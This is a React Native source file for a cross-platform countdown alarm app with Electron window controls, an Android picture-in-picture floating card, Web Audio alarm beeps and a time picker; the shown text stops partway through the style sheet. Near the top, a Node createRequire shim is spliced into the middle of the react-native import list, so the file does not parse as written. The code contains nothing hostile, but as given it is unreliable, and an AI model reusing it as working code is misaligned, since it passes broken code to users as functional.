import React, { useState, useEffect, useRef } from "react";
import {
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

  StyleSheet,
  Text,
  View,
  TextInput,
  TouchableOpacity,
  ScrollView,
  Platform,
  SafeAreaView,
  StatusBar,
  Vibration,
  Dimensions,
  NativeModules,
  DeviceEventEmitter,
} from "react-native";

// Helper: Get PC/Device current right time formatted for 12-hour AM/PM picker
const getDeviceCurrentTimeValues = () => {
  const now = new Date();
  let hours = now.getHours();
  const minutes = now.getMinutes();
  const period = hours >= 12 ? "PM" : "AM";
  hours = hours % 12;
  if (hours === 0) hours = 12;
  return {
    hour: String(hours).padStart(2, "0"),
    minute: String(minutes).padStart(2, "0"),
    period: period,
  };
};

// Cross-Platform Alarm Ringer Manager
// Android: Native Alarm Tone via MediaPlayer (PipModule)
// Web / Electron: Web Audio API Synthesizer Chime
class AlarmRingerManager {
  constructor() {
    this.ctx = null;
    this.intervalId = null;
    this.isPlaying = false;
  }

  start() {
    if (this.isPlaying) return;
    this.isPlaying = true;

    // Android native ringtone
    if (Platform.OS === "android") {
      try {
        NativeModules.PipModule?.playAlarmSound();
      } catch (err) {
        console.warn("Android native alarm error:", err);
      }
      return;
    }

    // Web / PC Desktop Web Audio API
    const playBeepBurst = () => {
      if (!this.isPlaying) return;
      if (Platform.OS !== "web" || typeof window === "undefined") return;

      try {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        if (!AudioCtx) return;
        if (!this.ctx || this.ctx.state === "closed") {
          this.ctx = new AudioCtx();
        }
        if (this.ctx.state === "suspended") {
          this.ctx.resume();
        }

        const now = this.ctx.currentTime;
        // 4 rapid high-frequency alarm beeps
        for (let i = 0; i < 4; i++) {
          const osc = this.ctx.createOscillator();
          const gain = this.ctx.createGain();

          osc.type = "sine";
          osc.frequency.setValueAtTime(i % 2 === 0 ? 987.77 : 1318.51, now + i * 0.12);

          const start = now + i * 0.12;
          gain.gain.setValueAtTime(0, start);
          gain.gain.linearRampToValueAtTime(0.45, start + 0.02);
          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.1);

          osc.connect(gain);
          gain.connect(this.ctx.destination);

          osc.start(start);
          osc.stop(start + 0.11);
        }
      } catch (err) {
        console.warn("Alarm audio error:", err);
      }
    };

    playBeepBurst();

    let burstCount = 0;
    this.intervalId = setInterval(() => {
      burstCount++;
      if (burstCount >= 25) {
        this.stop();
        return;
      }
      playBeepBurst();
    }, 1200);
  }

  stop() {
    this.isPlaying = false;
    if (Platform.OS === "android") {
      try {
        NativeModules.PipModule?.stopAlarmSound();
      } catch (err) {
        console.warn("Android stop alarm error:", err);
      }
    }
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
    }
    if (this.ctx) {
      try {
        this.ctx.close();
      } catch (e) { }
      this.ctx = null;
    }
  }
}

const alarmRinger = new AlarmRingerManager();

export default function App() {
  // Current Device Time
  const [currentTime, setCurrentTime] = useState(new Date());

  // Initialize Target Time with the current right time of the PC
  const initialPcTime = useRef(getDeviceCurrentTimeValues()).current;
  const [targetHour, setTargetHour] = useState(initialPcTime.hour);
  const [targetMinute, setTargetMinute] = useState(initialPcTime.minute);
  const [targetPeriod, setTargetPeriod] = useState(initialPcTime.period);

  // Keyboard typing handlers for Hour
  const handleHourChange = (text) => {
    const cleaned = text.replace(/[^0-9]/g, "").slice(0, 2);
    setTargetHour(cleaned);
  };

  const handleHourBlur = () => {
    let num = parseInt(targetHour, 10);
    if (isNaN(num) || num < 1) {
      num = 12;
    } else if (num > 12) {
      num = 12;
    }
    setTargetHour(String(num).padStart(2, "0"));
  };

  // Keyboard typing handlers for Minute
  const handleMinuteChange = (text) => {
    const cleaned = text.replace(/[^0-9]/g, "").slice(0, 2);
    setTargetMinute(cleaned);
  };

  const handleMinuteBlur = () => {
    let num = parseInt(targetMinute, 10);
    if (isNaN(num) || num < 0) {
      num = 0;
    } else if (num > 59) {
      num = 59;
    }
    setTargetMinute(String(num).padStart(2, "0"));
  };

  // Sync Target Time to Current PC Clock
  const handleSyncToCurrentPcTime = () => {
    const pcTime = getDeviceCurrentTimeValues();
    setTargetHour(pcTime.hour);
    setTargetMinute(pcTime.minute);
    setTargetPeriod(pcTime.period);
  };

  // Countdown State
  const [isActive, setIsActive] = useState(false);
  const [remainingSeconds, setRemainingSeconds] = useState(0);
  const [totalInitialSeconds, setTotalInitialSeconds] = useState(0);
  const [isCompleted, setIsCompleted] = useState(false);
  const [isRinging, setIsRinging] = useState(false);

  // Mini / Compact Widget Mode
  const [isMiniMode, setIsMiniMode] = useState(false);

  // Electron Desktop State
  const [isAlwaysOnTop, setIsAlwaysOnTop] = useState(true);
  const [isElectron, setIsElectron] = useState(false);

  // Timer reference
  const timerRef = useRef(null);
  const targetTimestampRef = useRef(null);

  // Detect Electron environment and sync always-on-top
  useEffect(() => {
    if (Platform.OS === "web" && typeof window !== "undefined" && window.electronAPI) {
      setIsElectron(true);
      window.electronAPI.getAlwaysOnTop().then((status) => {
        setIsAlwaysOnTop(status);
      });
    }
  }, []);

  // Auto-detect Android PiP enter and exit to update mode
  useEffect(() => {
    if (Platform.OS === "android") {
      const sub = DeviceEventEmitter.addListener("onPipModeChanged", (isInPip) => {
        setIsMiniMode(isInPip);
      });
      return () => sub?.remove();
    }
  }, []);

  // Auto-detect window height/width to toggle mini mode when resized small
  useEffect(() => {
    const handleResizeCheck = (width, height) => {
      if (typeof height !== "number" || isNaN(height)) return;
      if (height <= 260 || (height <= 320 && width <= 300)) {
        setIsMiniMode(true);
      } else if (height >= 340 && width >= 320) {
        setIsMiniMode(false);
      }
    };

    if (Platform.OS === "web" && typeof window !== "undefined") {
      const onResize = () => handleResizeCheck(window.innerWidth, window.innerHeight);
      window.addEventListener("resize", onResize);

      let unsubscribe = null;
      if (window.electronAPI?.onWindowResize) {
        unsubscribe = window.electronAPI.onWindowResize(({ width, height }) => {
          handleResizeCheck(width, height);
        });
      }

      return () => {
        window.removeEventListener("resize", onResize);
        if (unsubscribe) unsubscribe();
      };
    } else {
      const sub = Dimensions.addEventListener("change", ({ window: w }) => {
        handleResizeCheck(w.width, w.height);
      });
      return () => sub?.remove();
    }
  }, []);

  // Update live clock every second
  useEffect(() => {
    const clockInterval = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);
    return () => clearInterval(clockInterval);
  }, []);

  // Calculate target date based on hour, minute, period
  const getTargetDate = (h, m, p) => {
    const now = new Date();
    let hours24 = parseInt(h, 10);
    let mins = parseInt(m, 10);

    if (isNaN(hours24) || hours24 < 1) hours24 = 12;
    if (hours24 > 12) hours24 = 12;
    if (isNaN(mins) || mins < 0) mins = 0;
    if (mins > 59) mins = 59;

    if (p === "PM" && hours24 < 12) hours24 += 12;
    if (p === "AM" && hours24 === 12) hours24 = 0;

    const target = new Date(
      now.getFullYear(),
      now.getMonth(),
      now.getDate(),
      hours24,
      mins,
      0,
      0
    );

    if (target.getTime() <= now.getTime()) {
      target.setDate(target.getDate() + 1);
    }

    return target;
  };

  // Start Countdown
  const handleStartCountdown = () => {
    handleStopRinging();

    // Normalize values if user left input unblurred
    let hNum = parseInt(targetHour, 10);
    if (isNaN(hNum) || hNum < 1) hNum = 12;
    if (hNum > 12) hNum = 12;
    const cleanHour = String(hNum).padStart(2, "0");

    let mNum = parseInt(targetMinute, 10);
    if (isNaN(mNum) || mNum < 0) mNum = 0;
    if (mNum > 59) mNum = 59;
    const cleanMinute = String(mNum).padStart(2, "0");

    setTargetHour(cleanHour);
    setTargetMinute(cleanMinute);

    const target = getTargetDate(cleanHour, cleanMinute, targetPeriod);
    const targetMs = target.getTime();
    targetTimestampRef.current = targetMs;
    const diffSeconds = Math.max(0, Math.floor((targetMs - Date.now()) / 1000));

    if (diffSeconds <= 0) return;

    setTotalInitialSeconds(diffSeconds);
    setRemainingSeconds(diffSeconds);
    setIsActive(true);
    setIsCompleted(false);
  };

  // Stop Ringing
  const handleStopRinging = () => {
    alarmRinger.stop();
    try {
      Vibration.cancel();
    } catch (e) { }
    setIsRinging(false);
  };

  // Stop / Reset Countdown
  const handleReset = () => {
    handleStopRinging();
    targetTimestampRef.current = null;
    setIsActive(false);
    setIsCompleted(false);
    setRemainingSeconds(0);
    setTotalInitialSeconds(0);
    if (timerRef.current) clearInterval(timerRef.current);
  };

  // Quick preset handlers (+15m, +30m, +1h, etc.)
  const handleQuickAdd = (minutesToAdd) => {
    handleStopRinging();
    const futureDate = new Date(Date.now() + minutesToAdd * 60 * 1000);
    targetTimestampRef.current = futureDate.getTime();
    let hours = futureDate.getHours();
    const minutes = futureDate.getMinutes();
    const period = hours >= 12 ? "PM" : "AM";

    hours = hours % 12;
    if (hours === 0) hours = 12;

    const formattedHour = String(hours).padStart(2, "0");
    const formattedMinute = String(minutes).padStart(2, "0");

    setTargetHour(formattedHour);
    setTargetMinute(formattedMinute);
    setTargetPeriod(period);

    const diffSeconds = minutesToAdd * 60;
    setTotalInitialSeconds(diffSeconds);
    setRemainingSeconds(diffSeconds);
    setIsActive(true);
    setIsCompleted(false);
  };

  const triggerAlarmCompletion = () => {
    setIsActive(false);
    setIsCompleted(true);
    setIsRinging(true);
    alarmRinger.start();
    try {
      Vibration.vibrate([0, 500, 250, 500, 250, 500], true);
    } catch (e) { }

    if (typeof window !== "undefined" && window.electronAPI?.notifyTimeUp) {
      window.electronAPI.notifyTimeUp();
    }
  };

  const checkCountdownTick = () => {
    if (!targetTimestampRef.current || !isActive) return;
    const now = Date.now();
    const diff = Math.max(0, Math.ceil((targetTimestampRef.current - now) / 1000));
    if (diff <= 0) {
      setRemainingSeconds(0);
      targetTimestampRef.current = null;
      triggerAlarmCompletion();
    } else {
      setRemainingSeconds(diff);
    }
  };

  // Real-time countdown loop
  useEffect(() => {
    if (isActive && targetTimestampRef.current) {
      checkCountdownTick();
      timerRef.current = setInterval(() => {
        checkCountdownTick();
      }, 500);
    }

    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [isActive]);

  // Native Android PiP periodic ticker event listener
  useEffect(() => {
    if (Platform.OS === "android") {
      const subTick = DeviceEventEmitter.addListener("onPipTick", () => {
        checkCountdownTick();
      });
      return () => subTick?.remove();
    }
  }, [isActive]);

  // Format seconds to HH:MM:SS
  const formatTimeParts = (totalSecs) => {
    const hrs = Math.floor(totalSecs / 3600);
    const mins = Math.floor((totalSecs % 3600) / 60);
    const secs = totalSecs % 60;

    return {
      hours: String(hrs).padStart(2, "0"),
      minutes: String(mins).padStart(2, "0"),
      seconds: String(secs).padStart(2, "0"),
    };
  };

  const { hours, minutes, seconds } = formatTimeParts(remainingSeconds);

  // Format current live clock
  const liveClockString = currentTime.toLocaleTimeString([], {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: true,
  });

  // Calculate progress ratio (0 to 1)
  const progressRatio =
    totalInitialSeconds > 0
      ? Math.max(0, Math.min(1, 1 - remainingSeconds / totalInitialSeconds))
      : 0;

  // Toggle Mini / Full Window Mode
  const handleToggleMiniMode = () => {
    const nextMini = !isMiniMode;
    setIsMiniMode(nextMini);
    if (typeof window !== "undefined" && window.electronAPI?.setWindowSize) {
      if (nextMini) {
        // Compact mini-widget dimensions (sits unobtrusively in screen corner)
        window.electronAPI.setWindowSize(275, 102);
      } else {
        // Full normal window dimensions
        window.electronAPI.setWindowSize(390, 640);
      }
    }
  };

  // Android Picture-in-Picture (PiP) Floating Card Mode
  const handleEnterPip = async () => {
    if (Platform.OS === "android") {
      setIsMiniMode(true);
      const PipModule = NativeModules.PipModule;
      if (PipModule?.enterPipMode) {
        try {
          await PipModule.enterPipMode(190, 100);
        } catch (err) {
          console.warn("Failed to enter PiP mode:", err);
        }
      }
    }
  };

  // Desktop Window Controls via Electron IPC
  const handleMinimize = () => {
    if (window.electronAPI?.minimize) {
      window.electronAPI.minimize();
    }
  };

  const handleClose = () => {
    if (window.electronAPI?.close) {
      window.electronAPI.close();
    }
  };

  const handleTogglePin = async () => {
    if (window.electronAPI?.toggleAlwaysOnTop) {
      const nextState = await window.electronAPI.toggleAlwaysOnTop();
      setIsAlwaysOnTop(nextState);
    } else {
      setIsAlwaysOnTop(!isAlwaysOnTop);
    }
  };

  // ==========================================
  // MINI FLOATING WIDGET VIEW (Distraction-Free: ONLY Time Remaining Card)
  // ==========================================
  if (isMiniMode) {
    if (Platform.OS === "android") {
      return (
        <TouchableOpacity
          style={[styles.purePipContainer, isRinging && styles.purePipContainerRinging]}
          activeOpacity={0.9}
          onPress={isRinging ? handleStopRinging : null}
        >
          <StatusBar hidden={true} />
          {isRinging ? (
            <Text style={styles.purePipRingingText}>🔔 00:00:00</Text>
          ) : (
            <Text style={styles.purePipDigits}>
              {hours}:{minutes}:<Text style={styles.purePipSeconds}>{seconds}</Text>
            </Text>
          )}
        </TouchableOpacity>
      );
    }

    return (
      <SafeAreaView style={styles.miniSafeArea}>
        <StatusBar barStyle="light-content" backgroundColor="#090D16" />
        <View
          style={[
            styles.miniWidgetContainer,
            Platform.OS === "web" ? { WebkitAppRegion: "drag" } : null,
            isRinging && styles.miniWidgetRinging,
          ]}
        >
          {/* Mini Top Row: Target info + window controls */}
          <View style={styles.miniHeaderRow}>
            <View style={styles.miniTitleGroup}>
              <Text style={styles.miniAppIcon}>⏱</Text>
              <Text style={styles.miniTargetText}>
                {targetHour}:{targetMinute} {targetPeriod}
              </Text>
              <View style={[styles.miniStatusBadge, isActive ? styles.miniBadgeActive : styles.miniBadgeIdle]}>
                <Text style={styles.miniStatusBadgeText}>
                  {isActive ? "ACTIVE" : "READY"}
                </Text>
              </View>
            </View>

            <View
              style={[
                styles.miniActions,
                Platform.OS === "web" ? { WebkitAppRegion: "no-drag" } : null,
              ]}
            >
              {isElectron && (
                <TouchableOpacity
                  style={[styles.miniIconBtn, isAlwaysOnTop && styles.miniIconBtnActive]}
                  onPress={handleTogglePin}
                  title={isAlwaysOnTop ? "Pinned Always on Top" : "Unpinned"}
                >
                  <Text style={styles.miniIconText}>{isAlwaysOnTop ? "📌" : "📍"}</Text>
                </TouchableOpacity>
              )}
              <TouchableOpacity
                style={[styles.miniIconBtn, styles.miniExpandBtn]}
                onPress={handleToggleMiniMode}
                title="Expand to Full View"
              >
                <Text style={styles.miniExpandText}>🗖</Text>
              </TouchableOpacity>
              {isElectron && (
                <>
                  <TouchableOpacity
                    style={styles.miniIconBtn}
                    onPress={handleMinimize}
                    title="Minimize"
                  >
                    <Text style={styles.miniIconText}>−</Text>
                  </TouchableOpacity>
                  <TouchableOpacity
                    style={[styles.miniIconBtn, styles.miniCloseBtn]}
                    onPress={handleClose}
                    title="Close"
                  >
                    <Text style={styles.miniIconText}>✕</Text>
                  </TouchableOpacity>
                </>
              )}
            </View>
          </View>

          {/* Mini Countdown Body Row: ONLY Remaining Digits & Quick Control */}
          <View style={styles.miniBodyRow}>
            {isRinging ? (
              <TouchableOpacity
                style={[
                  styles.miniStopRingBtn,
                  Platform.OS === "web" ? { WebkitAppRegion: "no-drag" } : null,
                ]}
                onPress={handleStopRinging}
              >
                <Text style={styles.miniStopRingText}>🔔 TIME'S UP! STOP RING</Text>
              </TouchableOpacity>
            ) : (
              <View style={styles.miniMainRow}>
                <View style={styles.miniDigitsGroup}>
                  <Text style={styles.miniDigitText}>{hours}:{minutes}:</Text>
                  <Text style={[styles.miniDigitText, styles.secondsHighlight]}>{seconds}</Text>
                </View>

                <View
                  style={[
                    styles.miniControlsGroup,
                    Platform.OS === "web" ? { WebkitAppRegion: "no-drag" } : null,
                  ]}
                >
                  <TouchableOpacity
                    style={[
                      styles.miniQuickActionBtn,
                      isActive ? styles.miniStopBtn : styles.miniStartBtn,
                    ]}
                    onPress={isActive ? handleReset : handleStartCountdown}
                    title={isActive ? "Stop Timer" : "Start Countdown"}
                  >
                    <Text style={styles.miniQuickActionText}>
                      {isActive ? "⏹ Stop" : "▶ Start"}
                    </Text>
                  </TouchableOpacity>
                </View>
              </View>
            )}
          </View>

          {/* Mini Bottom Progress Line */}
          <View style={styles.miniProgressBarTrack}>
            <View
              style={[
                styles.miniProgressBarFill,
                { width: `${Math.round(progressRatio * 100)}%` },
              ]}
            />
          </View>
        </View>
      </SafeAreaView>
    );
  }

  // ==========================================
  // FULL EXPANDED VIEW
  // ==========================================
  return (
    <SafeAreaView style={styles.safeArea}>
      <StatusBar barStyle="light-content" backgroundColor="#090D16" />

      {/* Header & Window Controls */}
      <View
        style={[
          styles.headerBar,
          Platform.OS === "web" ? { WebkitAppRegion: "drag" } : null,
        ]}
      >
        <View style={styles.brandGroup}>
          <View style={styles.brandBadge}>
            <Text style={styles.brandIcon}>⏱</Text>
          </View>
          <View>
            <Text style={styles.headerTitle}>Time Management</Text>
            <Text style={styles.liveClockSubtitle}>{liveClockString}</Text>
          </View>
        </View>

        {/* Desktop Controls & Mini Toggle (Visible on Desktop PC) */}
        {isElectron && (
          <View
            style={[
              styles.windowActions,
              Platform.OS === "web" ? { WebkitAppRegion: "no-drag" } : null,
            ]}
          >
            {/* Mini Floating Mode Button */}
            <TouchableOpacity
              style={styles.miniModeToggleBtn}
              onPress={handleToggleMiniMode}
              title="Compact Floating Mini Mode"
            >
              <Text style={styles.miniModeToggleText}>🗗 Mini</Text>
            </TouchableOpacity>

            <TouchableOpacity
              style={[styles.pinBtn, isAlwaysOnTop && styles.pinBtnActive]}
              onPress={handleTogglePin}
              title={isAlwaysOnTop ? "Always On Top: ON" : "Always On Top: OFF"}
            >
              <Text style={styles.pinBtnText}>{isAlwaysOnTop ? "📌 Top" : "📍 Top"}</Text>
            </TouchableOpacity>

            <TouchableOpacity style={styles.winControlBtn} onPress={handleMinimize}>
              <Text style={styles.winControlText}>−</Text>
            </TouchableOpacity>
            <TouchableOpacity
              style={[styles.winControlBtn, styles.closeBtn]}
              onPress={handleClose}
            >
              <Text style={styles.winControlText}>✕</Text>
            </TouchableOpacity>
          </View>
        )}

        {/* Mobile Android Controls: PiP Floating Button */}
        {Platform.OS === "android" && (
          <View style={styles.windowActions}>
            <TouchableOpacity
              style={styles.miniModeToggleBtn}
              onPress={handleEnterPip}
              title="Float timer over other apps"
            >
              <Text style={styles.miniModeToggleText}>🗗 Floating</Text>
            </TouchableOpacity>
          </View>
        )}
      </View>

      <ScrollView
        contentContainerStyle={styles.scrollContent}
        showsVerticalScrollIndicator={false}
        keyboardShouldPersistTaps="handled"
      >
        {/* Completed Alert Modal/Banner with Stop Alarm Button */}
        {isCompleted && (
          <View style={[styles.alertCard, isRinging && styles.alertCardRinging]}>
            <Text style={styles.alertIcon}>{isRinging ? "🔔" : "✅"}</Text>
            <View style={styles.alertTextGroup}>
              <Text style={styles.alertTitle}>
                {isRinging ? "Time's Up! Ringing..." : "Time Reached!"}
              </Text>
              <Text style={styles.alertSubtitle}>
                Target: {targetHour}:{targetMinute} {targetPeriod}
              </Text>
            </View>
            <TouchableOpacity
              style={[styles.dismissBtn, isRinging && styles.stopRingBtn]}
              onPress={isRinging ? handleStopRinging : handleReset}
            >
              <Text style={styles.dismissBtnText}>
                {isRinging ? "⏹ Stop Ring" : "OK"}
              </Text>
            </TouchableOpacity>
          </View>
        )}

        {/* Hero Countdown Card */}
        <View style={[styles.card, styles.heroCard]}>
          <View style={styles.cardHeader}>
            <View style={styles.cardHeaderTitleGroup}>
              <Text style={styles.cardLabel}>
                {isActive ? "TIME REMAINING" : "COUNTDOWN TIMER"}
              </Text>
              {isElectron && (
                <TouchableOpacity
                  style={styles.cardMiniModeBtn}
                  onPress={handleToggleMiniMode}
                  title="Only show remaining card in compact mini widget"
                >
                  <Text style={styles.cardMiniModeBtnText}>🗗 Mini Card</Text>
                </TouchableOpacity>
              )}
              {Platform.OS === "android" && (
                <TouchableOpacity
                  style={styles.cardMiniModeBtn}
                  onPress={handleEnterPip}
                  title="Float countdown card over other apps"
                >
                  <Text style={styles.cardMiniModeBtnText}>🗗 Floating Card</Text>
                </TouchableOpacity>
              )}
            </View>
            <Text style={styles.targetLabelBadge}>
              Target: {targetHour}:{targetMinute} {targetPeriod}
            </Text>
          </View>

          {/* Large Digital Clock */}
          <View style={styles.digitalClockRow}>
            <View style={styles.digitBox}>
              <Text style={styles.digitNumber}>{hours}</Text>
              <Text style={styles.digitLabel}>HOURS</Text>
            </View>
            <Text style={styles.colonSeparator}>:</Text>
            <View style={styles.digitBox}>
              <Text style={styles.digitNumber}>{minutes}</Text>
              <Text style={styles.digitLabel}>MINS</Text>
            </View>
            <Text style={styles.colonSeparator}>:</Text>
            <View style={styles.digitBox}>
              <Text style={[styles.digitNumber, styles.secondsHighlight]}>{seconds}</Text>
              <Text style={styles.digitLabel}>SECS</Text>
            </View>
          </View>

          {/* Progress Bar */}
          {isActive && (
            <View style={styles.progressBarTrack}>
              <View
                style={[
                  styles.progressBarFill,
                  { width: `${Math.round(progressRatio * 100)}%` },
                ]}
              />
            </View>
          )}

          {/* Action Button: Start or Stop */}
          <TouchableOpacity
            style={[styles.primaryActionBtn, isActive && styles.stopActionBtn]}
            onPress={isActive ? handleReset : handleStartCountdown}
            activeOpacity={0.85}
          >
            <Text style={styles.primaryActionBtnText}>
              {isActive ? "⏹ Stop Timer" : "▶ Start Countdown"}
            </Text>
          </TouchableOpacity>
        </View>

        {/* Target Time Setting Section */}
        <View style={styles.card}>
          <View style={styles.sectionHeaderRow}>
            <View style={styles.sectionTitleGroup}>
              <Text style={styles.sectionHeading}>Set Target Time</Text>
              <Text style={styles.sectionSubtitle}>
                Type numbers or use steppers:
              </Text>
            </View>
            <TouchableOpacity
              style={styles.syncTimeBtn}
              onPress={handleSyncToCurrentPcTime}
              title="Reset target to current PC time"
            >
              <Text style={styles.syncTimeBtnText}>⏱ PC Time</Text>
            </TouchableOpacity>
          </View>

          {/* Time Picker Controls */}
          <View style={styles.pickerRow}>
            {/* Hour Selector */}
            <View style={styles.pickerUnit}>
              <Text style={styles.pickerUnitLabel}>Hour</Text>
              <View style={styles.stepperContainer}>
                <TouchableOpacity
                  style={styles.stepBtn}
                  onPress={() => {
                    const current = parseInt(targetHour, 10) || 12;
                    const next = (current % 12) + 1;
                    setTargetHour(String(next).padStart(2, "0"));
                  }}
                >
                  <Text style={styles.stepBtnText}>▲</Text>
                </TouchableOpacity>

                <TextInput
                  style={styles.pickerInput}
                  value={targetHour}
                  onChangeText={handleHourChange}
                  onBlur={handleHourBlur}
                  keyboardType="number-pad"
                  maxLength={2}
                  selectTextOnFocus={true}
                  placeholder="12"
                  placeholderTextColor="#475569"
                />

                <TouchableOpacity
                  style={styles.stepBtn}
                  onPress={() => {
                    const current = parseInt(targetHour, 10) || 12;
                    const prev = current === 1 ? 12 : current - 1;
                    setTargetHour(String(prev).padStart(2, "0"));
                  }}
                >
                  <Text style={styles.stepBtnText}>▼</Text>
                </TouchableOpacity>
              </View>
            </View>

            <Text style={styles.pickerColon}>:</Text>

            {/* Minute Selector (1 minute steps or direct keyboard typing) */}
            <View style={styles.pickerUnit}>
              <Text style={styles.pickerUnitLabel}>Minute</Text>
              <View style={styles.stepperContainer}>
                <TouchableOpacity
                  style={styles.stepBtn}
                  onPress={() => {
                    const current = parseInt(targetMinute, 10) || 0;
                    const next = (current + 1) % 60;
                    setTargetMinute(String(next).padStart(2, "0"));
                  }}
                >
                  <Text style={styles.stepBtnText}>▲</Text>
                </TouchableOpacity>

                <TextInput
                  style={styles.pickerInput}
                  value={targetMinute}
                  onChangeText={handleMinuteChange}
                  onBlur={handleMinuteBlur}
                  keyboardType="number-pad"
                  maxLength={2}
                  selectTextOnFocus={true}
                  placeholder="00"
                  placeholderTextColor="#475569"
                />

                <TouchableOpacity
                  style={styles.stepBtn}
                  onPress={() => {
                    const current = parseInt(targetMinute, 10) || 0;
                    const prev = (current - 1 + 60) % 60;
                    setTargetMinute(String(prev).padStart(2, "0"));
                  }}
                >
                  <Text style={styles.stepBtnText}>▼</Text>
                </TouchableOpacity>
              </View>
            </View>

            {/* AM/PM Switcher */}
            <View style={styles.pickerUnit}>
              <Text style={styles.pickerUnitLabel}>Period</Text>
              <View style={styles.periodSwitcher}>
                <TouchableOpacity
                  style={[styles.periodBtn, targetPeriod === "AM" && styles.periodBtnActive]}
                  onPress={() => setTargetPeriod("AM")}
                >
                  <Text
                    style={[
                      styles.periodBtnText,
                      targetPeriod === "AM" && styles.periodBtnTextActive,
                    ]}
                  >
                    AM
                  </Text>
                </TouchableOpacity>
                <TouchableOpacity
                  style={[styles.periodBtn, targetPeriod === "PM" && styles.periodBtnActive]}
                  onPress={() => setTargetPeriod("PM")}
                >
                  <Text
                    style={[
                      styles.periodBtnText,
                      targetPeriod === "PM" && styles.periodBtnTextActive,
                    ]}
                  >
                    PM
                  </Text>
                </TouchableOpacity>
              </View>
            </View>
          </View>
        </View>

        {/* Quick Presets & Test Sound */}
        <View style={styles.card}>
          <Text style={styles.sectionHeading}>Quick Presets & Sound</Text>
          <View style={styles.presetsGrid}>
            <TouchableOpacity style={styles.presetChip} onPress={() => handleQuickAdd(15)}>
              <Text style={styles.presetChipText}>+15 min</Text>
            </TouchableOpacity>
            <TouchableOpacity style={styles.presetChip} onPress={() => handleQuickAdd(30)}>
              <Text style={styles.presetChipText}>+30 min</Text>
            </TouchableOpacity>
            <TouchableOpacity style={styles.presetChip} onPress={() => handleQuickAdd(60)}>
              <Text style={styles.presetChipText}>+1 hour</Text>
            </TouchableOpacity>
            <TouchableOpacity
              style={[styles.presetChip, styles.testRingChip]}
              onPress={() => {
                if (isRinging) {
                  handleStopRinging();
                } else {
                  setIsRinging(true);
                  setIsCompleted(true);
                  alarmRinger.start();
                  if (typeof window !== "undefined" && window.electronAPI?.notifyTimeUp) {
                    window.electronAPI.notifyTimeUp();
                  }
                }
              }}
            >
              <Text style={[styles.presetChipText, styles.testRingText]}>
                {isRinging ? "⏹ Stop Sound" : "🔔 Test Ring"}
              </Text>
            </TouchableOpacity>
          </View>
        </View>

        <Text style={styles.footerNote}>
          {isElectron
            ? "🖥️ Desktop Floating Widget • Always on Top Active"
            : "📱 Mobile / Web Mode • Time Management"}
        </Text>
      </ScrollView>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  safeArea: {
    flex: 1,
    backgroundColor: "#090D16",
    paddingTop: Platform.OS === "android" ? StatusBar.currentHeight : 0,
  },
  headerBar: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    paddingHorizontal: 10,
    paddingVertical: 8,
    backgroundColor: "rgba(15, 23, 42, 0.95)",
    borderBottomWidth: 1,
    borderBottomColor: "rgba(255, 255, 255, 0.08)",
    gap: 4,
  },
  brandGroup: {
    flexDirection: "row",
    alignItems: "center",
    gap: 6,
    flexShrink: 1,
  },
  brandBadge: {
    width: 28,
    height: 28,
    borderRadius: 8,
    backgroundColor: "rgba(6, 182, 212, 0.15)",
    borderWidth: 1,
    borderColor: "rgba(6, 182, 212, 0.35)",
    alignItems: "center",
    justifyContent: "center",
  },
  brandIcon: {
    fontSize: 14,
  },
  headerTitle: {
    color: "#F8FAFC",
    fontSize: 13,
    fontWeight: "700",
    letterSpacing: -0.2,
  },
  liveClockSubtitle: {
    color: "#94A3B8",
    fontSize: 10,
    fontWeight: "500",
  },
  windowActions: {
    flexDirection: "row",
    alignItems: "center",
    gap: 3,
    flexShrink: 0,
  },
  miniModeToggleBtn: {
    paddingHorizontal: 7,
    paddingVertical: 4,
    borderRadius: 6,
    backgroundColor: "rgba(99, 102, 241, 0.18)",
    borderWidth: 1,
    borderColor: "rgba(99, 102, 241, 0.4)",
  },
  miniModeToggleText: {
    color: "#A5B4FC",
    fontSize: 10,
    fontWeight: "700",
  },
  pinBtn: {
    paddingHorizontal: 6,
    paddingVertical: 4,
    borderRadius: 6,
    backgroundColor: "rgba(255, 255, 255, 0.06)",
    borderWidth: 1,
    borderColor: "rgba(255, 255, 255, 0.1)",
  },
  pinBtnActive: {
    backgroundColor: "rgba(6, 182, 212, 0.2)",
    borderColor: "rgba(6, 182, 212, 0.5)",
  },
  pinBtnText: {
    color: "#E2E8F0",
    fontSize: 10,
    fontWeight: "600",
  },
  winControlBtn: {
    width: 24,
    height: 24,
    borderRadius: 6,
    backgroundColor: "rgba(255, 255, 255, 0.06)",
    alignItems: "center",
    justifyContent: "center",
  },
  closeBtn: {
    backgroundColor: "rgba(239, 68, 68, 0.15)",
  },
  winControlText: {
    color: "#CBD5E1",
    fontSize: 12,
    fontWeight: "bold",
  },
  scrollContent: {
    paddingHorizontal: 12,
    paddingVertical: 12,
    gap: 12,
  },
  alertCard: {
    flexDirection: "row",
    alignItems: "center",
    backgroundColor: "rgba(244, 63, 94, 0.16)",
    borderWidth: 1,
    borderColor: "rgba(244, 63, 94, 0.4)",
    borderRadius: 14,
    padding: 14,
    gap: 12,
  },
  alertCardRinging: {
    backgroundColor: "rgba(244, 63, 94, 0.25)",
    borderColor: "#F43F5E",
    shadowColor: "#F43F5E",
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.5,
    shadowRadius: 12,
  },
  alertIcon: {
    fontSize: 24,
  },
  alertTextGroup: {
    flex: 1,
  },
  alertTitle: {
    color: "#FDA4AF",
    fontSize: 15,
    fontWeight: "700",
  },
  alertSubtitle: {
    color: "#F43F5E",
    fontSize: 12,
    fontWeight: "500",
  },
  dismissBtn: {
    backgroundColor: "#F43F5E",
    paddingHorizontal: 14,
    paddingVertical: 7,
    borderRadius: 8,
  },
  stopRingBtn: {
    backgroundColor: "#EF4444",
  },
  dismissBtnText: {
    color: "#FFFFFF",
    fontSize: 12,
    fontWeight: "700",
  },
  card: {
    backgroundColor: "rgba(18, 26, 44, 0.75)",
    borderWidth: 1,
    borderColor: "rgba(255, 255, 255, 0.08)",
    borderRadius: 18,
    padding: 16,
  },
